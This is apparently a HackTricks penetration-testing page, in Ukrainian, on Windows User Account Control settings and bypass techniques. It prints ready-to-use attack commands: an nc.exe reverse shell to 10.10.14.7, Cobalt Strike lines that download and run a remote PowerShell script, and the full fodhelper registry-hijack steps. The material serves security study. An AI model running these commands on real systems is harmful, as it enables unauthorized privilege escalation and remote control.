# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка забезпечує запит підтвердження для підвищених дій (**consent prompt for elevated activities**). У додатків є різні `integrity` рівні, і програма з **високим рівнем** може виконувати завдання, які **потенційно можуть скомпрометувати систему**. Коли UAC увімкнено, додатки та завдання за замовчуванням **запускаються в контексті без прав адміністратора**, якщо тільки адміністратор явно не надає цим додаткам/завданням доступ адміністратора для виконання. Це зручна функція, яка захищає адміністраторів від ненавмисних змін, але не вважається межою безпеки.

Для детальнішої інформації про рівні цілісності:

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC активовано, користувачу-адміністратору надаються 2 токени: стандартний токен для виконання звичайних дій на звичайному рівні та один із правами адміністратора.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) розглядає роботу UAC детально і включає процес входу, досвід користувача та архітектуру UAC. Адміністратори можуть використовувати політики безпеки для налаштування роботи UAC у своїй організації на локальному рівні (через secpol.msc), або налаштовувати й розгортати через Group Policy Objects (GPO) в середовищі Active Directory. Різні налаштування детально описані [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Існує 10 налаштувань Group Policy, які можна встановити для UAC. Нижче наведено додаткові деталі:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Вимкнено                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Вимкнено                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Увімкнено (за замовчуванням для Home) Вимкнено (за замовчуванням для Enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Вимкнено                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Увімкнено                                                     |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Увімкнено                                                     |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Увімкнено                                                     |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Увімкнено                                                     |

### UAC Bypass Theory

Деякі програми **авто-піднімаються (autoelevated)**, якщо **користувач належить** до **групи адміністраторів**. Ці бінарні файли мають у своїх _**Manifests**_ опцію _**autoElevate**_ зі значенням _**True**_. Бінарний файл також має бути **підписаний Microsoft**.

Багато процесів з авто-підвищенням надають **функціональність через COM-об'єкти або RPC сервери**, які можна викликати з процесів, що працюють з середнім рівнем привілеїв (звичайні привілеї користувача). Зауважте, що COM (Component Object Model) і RPC (Remote Procedure Call) — це методи, які Windows-програми використовують для взаємодії та виконання функцій між різними процесами. Наприклад, **`IFileOperation COM object`** призначений для роботи з файловими операціями (копіювання, видалення, переміщення) і може автоматично підвищувати привілеї без запиту.

Зверніть увагу, що можуть виконуватися певні перевірки, наприклад перевірка, чи процес запускався з каталогу **System32**, яку можна обійти, наприклад, **інжектуючи в explorer.exe** або інший виконуваний файл, розташований у System32.

Ще один спосіб обійти ці перевірки — **змінити PEB**. Кожен процес у Windows має Process Environment Block (PEB), який містить важливі дані про процес, такі як шлях до виконуваного файлу. Змінюючи PEB, зловмисники можуть підробити (spoof) місцезнаходження свого шкідливого процесу, зробивши вигляд, ніби він запускається з довіреного каталогу (наприклад, system32). Ця підроблена інформація обманює COM-об'єкт і призводить до авто-підвищення привілеїв без запиту користувача.

Потім, щоб **обійти** **UAC** (піднятися з **medium** рівня цілісності **до high**), деякі атаки використовують такого роду бінарники для **виконання довільного коду**, оскільки він буде виконаний з процесу **High level integrity**.

Ви можете **перевірити** _**Manifest**_ бінарного файлу за допомогою утиліти _**sigcheck.exe**_ від Sysinternals. (`sigcheck.exe -m <file>`) А також ви можете **побачити** **рівень цілісності** процесів за допомогою _Process Explorer_ або _Process Monitor_ (від Sysinternals).

### Check UAC

To confirm if UAC is enabled do:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Якщо це **`1`**, то UAC **увімкнено**, якщо це **`0`** або він не існує, то UAC **вимкнено**.

Потім перевірте, **який рівень** налаштований:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Якщо **`0`**, тоді UAC не буде запитувати (як **вимкнено**)
- Якщо **`1`**, адміністратора **попросить ввести ім'я користувача та пароль** для запуску бінарника з підвищеними правами (на Secure Desktop)
- Якщо **`2`** (**Завжди сповіщати мене**), UAC завжди вимагатиме підтвердження від адміністратора, коли той намагається виконати щось з підвищеними привілеями (на Secure Desktop)
- Якщо **`3`** як `1`, але не обов'язково на Secure Desktop
- Якщо **`4`** як `2`, але не обов'язково на Secure Desktop
- якщо **`5`** (**за замовчуванням**) він проситиме адміністратора підтвердити запуск не-Windows бінарників з підвищеними правами

Далі перевірте значення ключа **`LocalAccountTokenFilterPolicy`**\
Якщо значення **`0`**, то лише користувач **RID 500** (**built-in Administrator**) може виконувати **адмінські завдання без UAC**, а якщо воно `1`, **всі облікові записи в групі "Administrators"** можуть це робити.

І нарешті перевірте значення ключа **`FilterAdministratorToken`**\
Якщо **`0`** (за замовчуванням), **обліковий запис built-in Administrator може** виконувати віддалені адміністративні завдання, а якщо **`1`**, вбудований обліковий запис Administrator **не може** виконувати віддалені адміністративні завдання, якщо тільки `LocalAccountTokenFilterPolicy` не встановлено на `1`.

#### Summary

- Якщо `EnableLUA=0` або **не існує**, **UAC вимкнено для всіх**
- Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=1`**, UAC вимкнено для всіх
- Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` і `FilterAdministratorToken=0`**, UAC відсутній для RID 500 (Built-in Administrator)
- Якщо `EnableLua=1` і **`LocalAccountTokenFilterPolicy=0` і `FilterAdministratorToken=1`**, UAC увімкнено для всіх

Усі ці відомості можна зібрати за допомогою модуля **metasploit**: `post/windows/gather/win_privs`

Ви також можете перевірити групи свого користувача та визначити рівень цілісності:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Зверніть увагу, що якщо у вас є графічний доступ до жертви, обхід UAC доволі простий — ви можете просто натиснути "Yes", коли з'явиться запит UAC

The UAC bypass потрібен у наступній ситуації: **UAC увімкнено, ваш процес працює в контексті medium integrity, і ваш користувач належить до групи administrators**.

Важливо зазначити, що **набагато складніше обійти UAC, якщо він встановлений на найвищий рівень безпеки (Always), ніж якщо він у будь-якому з інших рівнів (Default).**

### UAC disabled

Якщо UAC вже вимкнено (`ConsentPromptBehaviorAdmin` is **`0`**) ви можете **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** базовий UAC "bypass" (повний доступ до файлової системи)

Якщо у вас є shell від користувача, який входить до групи Administrators, ви можете **mount the C$** (спільний ресурс через SMB) локально змонтувати як новий диск і матимете **доступ до всього у файловій системі** (навіть до домашньої папки Administrator).

> [!WARNING]
> **Схоже, цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass за допомогою cobalt strike

Техніки Cobalt Strike працюватимуть лише якщо UAC не встановлено на максимальний рівень безпеки
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** і **Metasploit** також мають кілька модулів для **bypass** **UAC**.

### KRBUACBypass

Документація та інструмент: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) який є **збіркою** кількох UAC bypass exploits. Зауважте, що потрібно **скомпілювати UACME за допомогою Visual Studio або msbuild**. Процес компіляції створить кілька виконуваних файлів (наприклад `Source\Akagi\outout\x64\Debug\Akagi.exe`), вам потрібно буде знати **який саме вам потрібен.**\
Вам слід **бути обережним**, бо деякі bypasses можуть **запустити інші програми**, які **повідомлять** **користувача**, що відбувається щось.

UACME містить **версію збірки, з якої кожна техніка почала працювати**. Ви можете шукати техніку, що впливає на ваші версії:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, використовуючи [this](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінку, ви отримаєте випуск Windows `1607` за номерами збірок.

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений бінар `fodhelper.exe` автоматично підвищується в сучасних Windows. Під час запуску він опитує пер-юзерний шлях у реєстрі, наведений нижче, не перевіряючи значення `DelegateExecute`. Розміщення там команди дозволяє процесу Medium Integrity (якщо користувач у групі Administrators) породити процес High Integrity без появи запиту UAC.

Реєстровий шлях, який опитує fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Кроки PowerShell (встановіть свій payload, потім trigger):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- Працює, коли поточний користувач є членом групи Administrators і рівень UAC встановлено на default/lenient (не Always Notify з додатковими обмеженнями).
- Використовуйте шлях `sysnative` щоб запустити 64-бітний PowerShell з 32-бітного процесу на 64-бітному Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шлях до EXE). Уникайте інтерфейсів, що запитують дозволи, для більшої прихованості.

#### More UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### Обхід UAC через GUI

Якщо у вас є доступ до **GUI, ви можете просто прийняти запит UAC**, коли він з’явиться — вам насправді не потрібен обхід. Отже, отримання доступу до GUI дозволить вам обійти UAC.

Більше того, якщо ви отримали GUI-сесію, якою хтось користувався (наприклад через RDP), існують інструменти, що працюватимуть як адміністратор, з яких ви можете, наприклад, **запустити cmd як адмін** без повторного запиту UAC, наприклад [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи більш приховано.

### Шумний brute-force UAC bypass

Якщо вам байдуже до шуму, ви завжди можете **запустити щось на кшталт** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), що **проситиме підвищити права допоки користувач не погодиться**.

### Your own bypass - Basic UAC bypass methodology

Якщо подивитися на **UACME**, ви помітите, що **більшість UAC bypass-ів зловживають уразливістю DLL Hijacking** (в основному записом шкідливої dll у _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (check that when it is executed it runs in a high integrity level).
2. With procmon find "**NAME NOT FOUND**" events that can be vulnerable to **DLL Hijacking**.
3. You probably will need to **write** the DLL inside some **protected paths** (like C:\Windows\System32) were you don't have writing permissions. You can bypass this using:
1. **wusa.exe**: Windows 7,8 and 8.1. It allows to extract the content of a CAB file inside protected paths (because this tool is executed from a high integrity level).
2. **IFileOperation**: Windows 10.
4. Prepare a **script** to copy your DLL inside the protected path and execute the vulnerable and autoelevated binary.

### Another UAC bypass technique

Полягає в тому, щоб відслідковувати, чи намагається **autoElevated binary** прочитати з **реєстру** ім'я/шлях бінарника або команду для виконання (це більш цікаво, якщо бінар шукає цю інформацію в **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
